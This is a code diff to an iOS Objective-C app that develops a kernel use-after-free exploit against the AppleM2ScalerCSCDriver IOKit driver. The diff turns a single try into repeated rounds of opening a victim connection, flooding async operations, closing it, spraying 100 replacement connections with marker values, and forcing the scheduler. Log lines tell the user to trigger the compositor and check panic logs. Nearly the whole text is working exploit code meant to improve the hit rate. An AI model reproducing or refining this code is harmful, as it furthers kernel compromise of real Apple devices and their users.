@@ -7849,30 +7849,17 @@ static void *iohid_threadCopyEvent(void *arg) {
     io_service_t svc = sIOServiceGetMatchingService(mp, sIOServiceMatching("AppleM2ScalerCSCDriver"));
     if (!svc) {
         [self appendLog:@"[FATAL] AppleM2ScalerCSCDriver service NOT FOUND on this device"];
-        [self appendLog:@"A15 (iPhone 13) may not have this driver — kext name may differ"];
         return;
     }
     [self appendLog:@"[OK] AppleM2ScalerCSCDriver service found"];
 
-    // === STEP 1: Open victim connection ===
-    [self appendLog:@"\n--- STEP 1: Open victim connection ---"];
-    io_connect_t victim = IO_OBJECT_NULL;
-    IOReturn kr = sIOServiceOpen(svc, mach_task_self(), 0, &victim);
-    [self appendLog:[NSString stringWithFormat:@"Victim conn: 0x%x (kr=0x%x)", victim, kr]];
-    if (kr != 0 || !victim) {
-        [self appendLog:@"[FAIL] Cannot open victim connection"];
-        sIOObjectRelease(svc);
-        return;
-    }
-
-    // Create IOSurface pair
+    // Create IOSurface pair (reusable)
     NSDictionary *sp = @{(id)kIOSurfaceWidth:@(32),(id)kIOSurfaceHeight:@(32),
                          (id)kIOSurfaceBytesPerElement:@(4),(id)kIOSurfacePixelFormat:@(0x42475241)};
     IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
     IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
     if (!srcS || !dstS) {
         [self appendLog:@"[FAIL] Cannot create IOSurface"];
-        sIOServiceClose(victim);
         sIOObjectRelease(svc);
         return;
     }
@@ -7884,62 +7871,62 @@ static void *iohid_threadCopyEvent(void *arg) {
     *(uint32_t *)(baseline + 0) = srcID;
     *(uint32_t *)(baseline + 4) = dstID;
 
-    // Sync baseline first
-    kr = sIOConnectCallMethod(victim, 1, NULL, 0, baseline, TSD_SIZE, NULL, NULL, NULL, NULL);
-    [self appendLog:[NSString stringWithFormat:@"Sync baseline (sel=1): kr=0x%x", kr]];
+    // === ROUND-BASED APPROACH: repeat close+spray to increase hit chance ===
+    for (int attempt = 0; attempt < 5; attempt++) {
+        [self appendLog:[NSString stringWithFormat:@"\n========== ATTEMPT %d/5 ==========", attempt + 1]];
 
-    // === STEP 2: Set credit marker and submit async ops ===
-    [self appendLog:@"\n--- STEP 2: credit=0xDEAD0001, 50 async ops ---"];
-    {
-        uint8_t s10[0x18]; memset(s10, 0, 0x18);
-        *(uint32_t *)s10 = 0xDEAD0001;
-        uint64_t sc[3] = {0,0,0};
-        kr = sIOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
-        [self appendLog:[NSString stringWithFormat:@"Sel 10 (credit=0xDEAD0001): kr=0x%x", kr]];
-    }
-
-    int asyncOK = 0;
-    for (int i = 0; i < 50; i++) {
-        uint8_t async_tsd[TSD_SIZE];
-        memcpy(async_tsd, baseline, TSD_SIZE);
-        *(uint64_t *)(async_tsd + 0x008) = 1;  // Async path
-        kr = sIOConnectCallMethod(victim, 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
-        if (kr == 0) asyncOK++;
-    }
-    [self appendLog:[NSString stringWithFormat:@"Async ops: %d/50 OK", asyncOK]];
-
-    // === STEP 3: Close victim connection ===
-    [self appendLog:@"\n--- STEP 3: CLOSE victim (free per_client + ops) ---"];
-    kr = sIOServiceClose(victim);
-    [self appendLog:[NSString stringWithFormat:@"IOServiceClose: kr=0x%x", kr]];
-    [self appendLog:@"Stale scheduler entries may still reference freed memory"];
-
-    // === STEP 4: Spray replacement connections ===
-    [self appendLog:@"\n--- STEP 4: Spray 50 connections (credit=0xBEEF0002) ---"];
-    io_connect_t spray[50];
-    int sprayOK = 0;
-    for (int i = 0; i < 50; i++) {
-        spray[i] = IO_OBJECT_NULL;
-        kr = sIOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
-        if (kr == 0 && spray[i]) {
-            sprayOK++;
-            uint8_t s10[0x18]; memset(s10, 0, 0x18);
-            *(uint32_t *)s10 = 0xBEEF0002;
-            uint64_t sc[3] = {0,0,0};
-            sIOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        // === STEP 1: Open victim connection ===
+        io_connect_t victim = IO_OBJECT_NULL;
+        IOReturn kr = sIOServiceOpen(svc, mach_task_self(), 0, &victim);
+        if (kr != 0 || !victim) {
+            [self appendLog:@"[FAIL] Cannot open victim connection"];
+            continue;
         }
-    }
-    [self appendLog:[NSString stringWithFormat:@"Spray: %d/50 OK", sprayOK]];
+        [self appendLog:[NSString stringWithFormat:@"Victim: 0x%x", victim]];
 
-    // === STEP 5: Trigger scheduler via compositor activity ===
-    [self appendLog:@"\n--- STEP 5: Submit ops on spray + WAIT FOR TRIGGER ---"];
-    [self appendLog:@"iPhone 13: Swipe Control Center or Notification Center"];
-    [self appendLog:@"This drives SpringBoard compositor → scaler scheduler"];
-    [self appendLog:@"Expected: x9=0xBEEF0002 (UAF) or x9=0xDEAD0001 (stale)"];
-    [self appendLog:@"\nSubmitting ops on spray connections..."];
+        // Sync baseline
+        kr = sIOConnectCallMethod(victim, 1, NULL, 0, baseline, TSD_SIZE, NULL, NULL, NULL, NULL);
 
-    for (int round = 0; round < 100; round++) {
-        for (int i = 0; i < sprayOK && i < 50; i++) {
+        // Set credit=0xDEAD0001 via selector 10
+        {
+            uint8_t s10[0x18]; memset(s10, 0, 0x18);
+            *(uint32_t *)s10 = 0xDEAD0001;
+            uint64_t sc[3] = {0,0,0};
+            sIOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+
+        // Submit 200 async ops (no delay — maximize scheduler heap fill)
+        int asyncOK = 0;
+        for (int i = 0; i < 200; i++) {
+            uint8_t async_tsd[TSD_SIZE];
+            memcpy(async_tsd, baseline, TSD_SIZE);
+            *(uint64_t *)(async_tsd + 0x008) = 1;
+            kr = sIOConnectCallMethod(victim, 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
+            if (kr == 0) asyncOK++;
+        }
+        [self appendLog:[NSString stringWithFormat:@"Async ops: %d/200 OK", asyncOK]];
+
+        // === STEP 2: Close victim (free per_client + ops, stale scheduler entries) ===
+        sIOServiceClose(victim);
+
+        // === STEP 3: Spray 100 connections with credit=0xBEEF0002 ===
+        io_connect_t spray[100];
+        int sprayOK = 0;
+        for (int i = 0; i < 100; i++) {
+            spray[i] = IO_OBJECT_NULL;
+            kr = sIOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
+            if (kr == 0 && spray[i]) {
+                sprayOK++;
+                uint8_t s10[0x18]; memset(s10, 0, 0x18);
+                *(uint32_t *)s10 = 0xBEEF0002;
+                uint64_t sc[3] = {0,0,0};
+                sIOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            }
+        }
+        [self appendLog:[NSString stringWithFormat:@"Spray: %d/100 OK", sprayOK]];
+
+        // === STEP 4: Submit ops on spray to reuse freed slots ===
+        for (int i = 0; i < sprayOK; i++) {
             if (spray[i]) {
                 uint8_t async_tsd[TSD_SIZE];
                 memcpy(async_tsd, baseline, TSD_SIZE);
@@ -7947,19 +7934,45 @@ static void *iohid_threadCopyEvent(void *arg) {
                 sIOConnectCallMethod(spray[i], 1, NULL, 0, async_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
             }
         }
-        if (round % 10 == 0) {
-            [self appendLog:[NSString stringWithFormat:@"  Round %d/100 — SWIPE CONTROL CENTER NOW", round]];
+
+        // === STEP 5: Force scheduler via SYNC ops (block until scheduler runs) ===
+        [self appendLog:@"Force scheduler via sync ops (sel=1, async flag=0)..."];
+        for (int i = 0; i < 10; i++) {
+            if (spray[i] && spray[i] != IO_OBJECT_NULL) {
+                uint8_t sync_tsd[TSD_SIZE];
+                memcpy(sync_tsd, baseline, TSD_SIZE);
+                *(uint64_t *)(sync_tsd + 0x008) = 0;  // SYNC — blocks until scheduler runs
+                kr = sIOConnectCallMethod(spray[i], 1, NULL, 0, sync_tsd, TSD_SIZE, NULL, NULL, NULL, NULL);
+                [self appendLog:[NSString stringWithFormat:@"  Sync op %d: kr=0x%x", i, kr]];
+            }
         }
-        usleep(100000);
+
+        // Clean up spray connections for this round
+        for (int i = 0; i < 100; i++) {
+            if (spray[i] && spray[i] != IO_OBJECT_NULL) {
+                sIOServiceClose(spray[i]);
+            }
+        }
+        [self appendLog:[NSString stringWithFormat:@"Attempt %d complete (no crash on this round)", attempt + 1]];
     }
 
-    [self appendLog:@"\n=== DONE: 100 rounds completed ==="];
-    [self appendLog:@"If device hasn't panicked, swipe Control Center"];
-    [self appendLog:@"Then check panic log for x9 register value"];
-    [self appendLog:@"x9=0xBEEF0002 → UAF confirmed (spray marker read)"];
+    // === FINAL: Keep alive, try IOSurface churn to force compositor ===
+    [self appendLog:@"\n=== All rounds complete ==="];
+    [self appendLog:@"Starting IOSurface churn — open Control Center NOW"];
+    for (int n = 0; n < 30; n++) {
+        // Rapid IOSurface create/destroy to force compositor/scaler activity
+        for (int i = 0; i < 20; i++) {
+            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+            if (s) CFRelease(s);
+        }
+        if (n % 5 == 0)
+            [self appendLog:[NSString stringWithFormat:@"  Churn round %d/30 — swipe CC!", n]];
+        usleep(500000);
+    }
 
     sIOObjectRelease(svc);
-    while (1) { sleep(5); [self appendLog:@"  alive (waiting for scheduler trigger)..."]; }
+    [self appendLog:@"\nDone. If no crash, check later panic logs for x9 register."];
+    while (1) { sleep(5); [self appendLog:@"  alive..."]; }
 }
 
 @end
